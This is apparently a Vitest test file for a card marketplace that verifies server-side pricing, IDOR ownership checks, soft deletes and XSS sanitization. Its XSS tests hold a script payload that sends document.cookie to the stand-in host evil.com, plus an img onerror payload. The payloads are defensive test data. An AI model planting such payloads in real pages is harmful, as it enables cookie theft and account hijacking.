import { describe, it, expect } from 'vitest';
import { sanitizePlainText } from '../src/lib/sanitize';
import { extractSellerId } from '../src/lib/sellerNotes';

describe('Order Security & IDOR Verification Tests', () => {
  describe('Backend Dynamic Price Calculation Logic', () => {
    it('completely ignores client-submitted prices and computes total from database prices', () => {
      // Simulating database rows
      const dbInventory = new Map([
        ['inv_card_1', { id: 'inv_card_1', price_huf: 15000, quantity: 2, status: 'In Stock' }],
        ['inv_card_2', { id: 'inv_card_2', price_huf: 4500, quantity: 5, status: 'In Stock' }],
      ]);

      // Malicious client payload trying to buy 15,000 Ft and 4,500 Ft cards for 1 Ft each
      const tamperedClientItems = [
        { inventory_id: 'inv_card_1', quantity: 1, price_huf: 1 },
        { inventory_id: 'inv_card_2', quantity: 2, price_huf: 1 },
      ];

      // Server-side verification function as implemented in /api/orders
      function calculateServerVerifiedOrder(clientItems: typeof tamperedClientItems, shippingFee: number) {
        let subtotalHuf = 0;
        const verifiedLines = [];

        for (const line of clientItems) {
          const dbItem = dbInventory.get(line.inventory_id);
          if (!dbItem) throw new Error('Item not found');
          if (dbItem.status !== 'In Stock' || dbItem.quantity < line.quantity) {
            throw new Error('Out of stock');
          }

          // SERVER TRUTH: DB price only
          const unitPrice = Math.max(0, Math.round(Number(dbItem.price_huf) || 0));
          subtotalHuf += (unitPrice * line.quantity);

          verifiedLines.push({
            inventory_id: line.inventory_id,
            price_huf: unitPrice,
            quantity: line.quantity,
          });
        }

        const totalHuf = subtotalHuf + shippingFee;
        return { subtotalHuf, totalHuf, verifiedLines };
      }

      const result = calculateServerVerifiedOrder(tamperedClientItems, 1200);

      // Even though client sent price_huf = 1, server correctly calculates:
      // Item 1: 15,000 * 1 = 15,000
      // Item 2: 4,500 * 2 = 9,000
      // Subtotal: 24,000
      // Shipping: 1,200
      // Total: 25,200
      expect(result.subtotalHuf).toBe(24000);
      expect(result.totalHuf).toBe(25200);
      expect(result.verifiedLines[0].price_huf).toBe(15000);
      expect(result.verifiedLines[1].price_huf).toBe(4500);
    });

    it('rejects order when requested quantity exceeds available database stock', () => {
      const dbInventory = new Map([
        ['inv_rare_1', { id: 'inv_rare_1', price_huf: 50000, quantity: 1, status: 'In Stock' }],
      ]);

      const clientRequest = [{ inventory_id: 'inv_rare_1', quantity: 2 }];

      expect(() => {
        const item = dbInventory.get(clientRequest[0].inventory_id)!;
        if (item.quantity < clientRequest[0].quantity) {
          throw new Error('Insufficient stock');
        }
      }).toThrow('Insufficient stock');
    });
  });

  describe('IDOR Authorization Logic', () => {
    it('prevents non-owner users from mutating listings', () => {
      const listingNotes = JSON.stringify({
        source: 'marketplace',
        seller_id: 'user_alice_123',
      });

      const callerBob = { id: 'user_bob_456', isAdmin: false };
      const callerAdmin = { id: 'user_admin_999', isAdmin: true };

      const sellerId = extractSellerId(listingNotes);

      function canMutateListing(caller: { id: string; isAdmin: boolean }, ownerId: string | null) {
        if (!ownerId) return false;
        return caller.id === ownerId || caller.isAdmin;
      }

      expect(canMutateListing(callerBob, sellerId)).toBe(false);
      expect(canMutateListing(callerAdmin, sellerId)).toBe(true);
      expect(canMutateListing({ id: 'user_alice_123', isAdmin: false }, sellerId)).toBe(true);
    });

    it('prevents non-admin callers from deleting orders they do not own or unverified order IDs', () => {
      const orders = [
        { order_number: 'ORD-101', user_id: 'user_alice', customer_info: { email: 'alice@example.com' } },
        { order_number: 'ORD-102', user_id: 'user_bob', customer_info: { email: 'bob@example.com' } },
      ];

      function resolveRemovableOrders(
        targets: string[],
        caller: { id: string; email?: string; isAdmin: boolean },
        currentOrders: typeof orders
      ): string[] {
        const removable: string[] = [];
        for (const num of targets) {
          const found = currentOrders.find(o => o.order_number === num);
          if (caller.isAdmin) {
            removable.push(num);
          } else if (found && (found.user_id === caller.id || found.customer_info?.email === caller.email)) {
            removable.push(num);
          }
        }
        return removable;
      }

      // Alice tries to delete her own order ORD-101 AND Bob's order ORD-102 AND an unindexed ORD-999
      const aliceCaller = { id: 'user_alice', email: 'alice@example.com', isAdmin: false };
      const aliceAllowed = resolveRemovableOrders(['ORD-101', 'ORD-102', 'ORD-999'], aliceCaller, orders);
      expect(aliceAllowed).toEqual(['ORD-101']);

      // Admin caller can delete any target
      const adminCaller = { id: 'admin_1', email: 'admin@tcgxchange.net', isAdmin: true };
      const adminAllowed = resolveRemovableOrders(['ORD-101', 'ORD-102', 'ORD-999'], adminCaller, orders);
      expect(adminAllowed).toEqual(['ORD-101', 'ORD-102', 'ORD-999']);
    });

    it('performs soft delete (deleted: true) preserving order records in database', () => {
      const dbOrders = [
        { order_number: 'ORD-101', user_id: 'user_alice', deleted: false, status: 'Cancelled' },
        { order_number: 'ORD-102', user_id: 'user_bob', deleted: false, status: 'Delivered' },
      ];

      function softDeleteOrder(orderNumber: string, callerId: string) {
        const order = dbOrders.find(o => o.order_number === orderNumber);
        if (!order || order.user_id !== callerId) throw new Error('Unauthorized or not found');
        order.deleted = true;
        return order;
      }

      // Alice soft-deletes her cancelled order
      const updated = softDeleteOrder('ORD-101', 'user_alice');
      expect(updated.deleted).toBe(true);

      // Verify the record is preserved in the database (length is still 2)
      expect(dbOrders.length).toBe(2);

      // Verify filtering: user view excludes deleted orders, admin view includes them
      const userVisible = dbOrders.filter(o => !o.deleted);
      expect(userVisible.length).toBe(1);
      expect(userVisible[0].order_number).toBe('ORD-102');

      const adminAll = dbOrders;
      expect(adminAll.length).toBe(2);
    });
  });

  describe('Stored XSS Sanitization on User Notes and Descriptions', () => {
    it('strips malicious script payloads from listing and order notes', () => {
      const xssInput = 'Great condition <script>document.location="http://evil.com?c="+document.cookie</script>';
      const clean = sanitizePlainText(xssInput, 200);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('</script>');
      expect(clean).toBe('Great condition document.location="http://evil.com?c="+document.cookie');
    });

    it('cleans order delivery contact notes', () => {
      const maliciousName = 'John Doe <img src=x onerror=alert(1)>';
      const clean = sanitizePlainText(maliciousName, 50);
      expect(clean).toBe('John Doe');
    });
  });
});
